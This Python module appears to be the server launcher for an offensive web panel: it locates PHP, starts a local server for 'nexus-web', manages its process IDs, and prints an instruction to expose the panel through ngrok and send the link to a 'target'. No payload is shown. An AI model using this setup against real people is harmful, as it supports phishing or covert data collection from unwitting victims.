from colorama import Fore,Back,Style
import subprocess,json,time,hashlib,platform,os

def find_php_executable():
    """Find PHP executable on Windows or Unix systems"""
    import shutil
    
    # First, try to find php in PATH
    php_path = shutil.which("php")
    if php_path:
        return php_path
    
    # On Windows, check common installation locations
    if platform.system() == "Windows":
        common_paths = [
            r"C:\xampp\php\php.exe",
            r"C:\wamp64\bin\php\php8.2.0\php.exe",
            r"C:\wamp\bin\php\php8.2.0\php.exe",
            r"C:\php\php.exe",
            r"C:\Program Files\PHP\php.exe",
            r"C:\Program Files (x86)\PHP\php.exe",
        ]
        
        for path in common_paths:
            if os.path.exists(path):
                return path
    
    return None

def kill_php_proc():
    with open("nexus-web/Settings.json", "r") as jsonFile:
        data = json.load(jsonFile)
        pid = data["pid"]

    try:
        is_windows = platform.system() == "Windows"
        for i in pid:
            if is_windows:
                # Use taskkill on Windows
                subprocess.run(f"taskkill /F /PID {i}", shell=True, capture_output=True)
            else:
                # Use kill on Unix systems
                subprocess.getoutput(f"kill -9 {i}")
        
        pid.clear()
        data["pid"] = []
        with open("nexus-web/Settings.json", "w") as jsonFile:
            json.dump(data, jsonFile)

    except:
        pass



def md5_hash():
    str2hash = time.strftime("%Y-%m-%d-%H:%M", time.gmtime())
    result = hashlib.md5(str2hash.encode())
    return result



def run_php_server(port):
    # Find PHP executable
    php_exe = find_php_executable()
    
    if not php_exe:
        print(Fore.RED + " [ERROR] " + Fore.WHITE + "PHP not found!")
        print(Fore.YELLOW + " Please install PHP and add it to your PATH, or install XAMPP/WAMP.")
        print(Fore.CYAN + " Common locations checked:")
        print("   - C:\\xampp\\php\\php.exe")
        print("   - C:\\wamp64\\bin\\php\\php8.2.0\\php.exe")
        print("   - C:\\php\\php.exe")
        print(Fore.WHITE + " Download PHP from: https://windows.php.net/download/")
        exit(1)
    
    try:
        with open(f"nexus-web/log/php-{md5_hash().hexdigest()}.log","w") as php_log:
            proc_info = subprocess.Popen(
                (php_exe, "-S", f"localhost:{port}", "-t", "nexus-web"),
                stderr=php_log,
                stdout=php_log
            ).pid

        with open("nexus-web/Settings.json", "r") as jsonFile:
            data = json.load(jsonFile)
            data["pid"].append(proc_info)

        with open("nexus-web/Settings.json", "w") as jsonFile:
            json.dump(data, jsonFile)

        print(Fore.RED+" [+] "+Fore.GREEN+"Web Panel Link : "+Fore.WHITE+f"http://localhost:{port}")
        print(Fore.RED+"\n [+] "+Fore.LIGHTCYAN_EX+f"Please Run NGROK On Port {port} AND Send Link To Target > "+Fore.YELLOW+Back.BLACK+f"ngrok http {port}\n"+Style.RESET_ALL)
    
    except Exception as e:
        print(Fore.RED + f" [ERROR] Failed to start PHP server: {e}")
        print(Fore.YELLOW + " Make sure PHP is installed and working correctly.")
        exit(1)


